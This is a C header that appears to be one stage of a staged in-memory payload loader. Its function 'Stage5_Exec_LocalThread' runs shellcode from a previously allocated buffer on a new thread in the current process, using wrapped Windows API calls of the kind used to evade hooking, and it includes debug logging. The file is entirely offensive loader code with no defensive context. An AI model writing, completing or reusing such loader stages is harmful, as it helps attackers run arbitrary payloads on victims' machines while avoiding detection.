#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"
#include "../context.h"

inline BOOL Stage5_Exec_LocalThread(TechniqueContext* ctx)
{

    if (!ctx || !ctx->allocated_mem)
        return FALSE;

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 5", "Execute payload at %p", ctx->allocated_mem);
#endif

    HANDLE hThread = MyCreateThreadEx(
        (HANDLE)-1,
        (LPTHREAD_START_ROUTINE)ctx->allocated_mem,
        NULL,
        0
    );

    if (!hThread)
    {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 5", "CreateThread failed");
#endif
        return FALSE;
    }

    MyWaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 5", "Execution finished");
#endif

    return TRUE;
}